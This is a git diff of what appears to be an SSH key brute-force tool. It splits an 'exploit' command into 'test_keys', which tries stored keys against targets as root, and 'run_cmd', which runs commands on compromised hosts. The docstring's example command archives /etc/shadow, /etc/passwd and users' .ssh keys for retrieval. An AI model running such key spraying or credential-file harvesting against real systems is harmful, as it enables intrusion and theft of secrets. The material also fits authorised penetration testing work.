@@ -84,6 +84,8 @@ def file_len(fname):
             pass
     return i + 1
 
+def truncate(data):
+    return (data[:75] + '..') if len(data) > 75 else data
 
 def progbar(curr, total, full_progbar=20):
     frac = curr / total
@@ -502,9 +504,9 @@ class Shell(cmd2.Cmd):
             pass
 
         def auth_completed(self):
-            log.debug(f'[+] [{self.log_id}] Authentication successful with {self.key_fingerprint} for {self.username}.')
             if not self.key_fingerprint:
                 raise Exception("Authenticated with no key")
+            log.info(f'[+] [{self.log_id}] Authentication successful with {self.key_fingerprint} for {self.username}.')
             cred = self.db.query(Credential).filter(Credential.host_address == self.host_address).filter(Credential.host_port == self.host_port).filter(
                 Credential.key_fingerprint == self.key_fingerprint).filter(Credential.username == self.username).first()
             if not cred:
@@ -588,7 +590,7 @@ class Shell(cmd2.Cmd):
                 log.debug(f'[*] [{log_id}] Connection created')
                 async with conn:
                     for cmd in cmds:
-                        log.debug(f'[{log_id}] executing cmd: {cmd}')
+                        log.debug(f'[{log_id}] Executing cmd: {cmd}')
                         cmd_alias = self.db.query(CommandiAlias.cmd).filter(
                             CommandiAlias.alias == cmd).scalar()
                         c = self.db.query(Command).filter(Command.host_address == host_address).filter(Command.host_port == host_port).filter(
@@ -604,14 +606,12 @@ class Shell(cmd2.Cmd):
                             se = res.stderr
                             es = res.exit_status
                             c.exit_status = es
-                            # log.debug(f'[{host_address}:{host_port}]
-                            # exit: {es}')
+                            log.debug(f'[{log_id}] Status: {es} OUT: "{truncate(so)}" ERR: "{truncate(se)}"')
                             if es != 0:
                                 c.stderr = se
-                                log.info(f'[{log_id}] [{es}] "{se}"')
                             else:
                                 c.stdout = so
-                                log.debug(f'[{log_id}] [{es}] "{so}"')
+                            c.updated = func.current_timestamp()
                         except Exception as ex:
                             msg = str(ex)
                             log.warning(f'[{log_id}] "{cmd}" {msg}')
@@ -630,7 +630,7 @@ class Shell(cmd2.Cmd):
                 if conn:
                     conn.abort()
 
-    async def schedule_jobs(self, usernames, cmds=None):
+    async def schedule_jobs(self, usernames=None, cmds=None):
 
         keys = {x.fingerprint: x.private_key for x in self.db.query(Key)}
 
@@ -686,21 +686,31 @@ class Shell(cmd2.Cmd):
         print()
         log.info(75 * '-')
 
-    exploit_parser = cmd2.Cmd2ArgumentParser()
-    exploit_parser.add_argument(
+    test_keys_parser = cmd2.Cmd2ArgumentParser()
+    test_keys_parser.add_argument(
         '-u', '--user', type=str, nargs='*', default=['root'],
         help='Use alternate username (default is root)')
-    exploit_parser.add_argument(
+
+    @cmd2.with_argparser(test_keys_parser)
+    @cmd2.with_category(CMD_CAT_SSHAME)
+    def do_test_keys(self, arg):
+        '''Test avaiable keys on target hosts. Specify username with -u parameter, default = root.
+E.g. test_keys -u root admin'''
+        asyncio.get_event_loop().run_until_complete(
+            self.schedule_jobs(arg.user))
+
+    run_cmd_parser = cmd2.Cmd2ArgumentParser()
+    run_cmd_parser.add_argument(
         '-c', '--command', type=str, nargs='*',
         help='Execute given commands on target')
 
-    @cmd2.with_argparser(exploit_parser)
+    @cmd2.with_argparser(run_cmd_parser)
     @cmd2.with_category(CMD_CAT_SSHAME)
-    def do_exploit(self, arg):
-        '''Brute force targets using available keys
-E.g. exploit -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode file.tar.gz"'''
+    def do_run_cmd(self, arg):
+        '''Run command on targets, where we have a valid credentials.
+E.g. run_cmd -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode file.tar.gz"'''
         asyncio.get_event_loop().run_until_complete(
-            self.schedule_jobs(arg.user, arg.command))
+            self.schedule_jobs(None, arg.command))
 
     commands_parser = cmd2.Cmd2ArgumentParser()
     commands_item_group = commands_parser.add_mutually_exclusive_group()
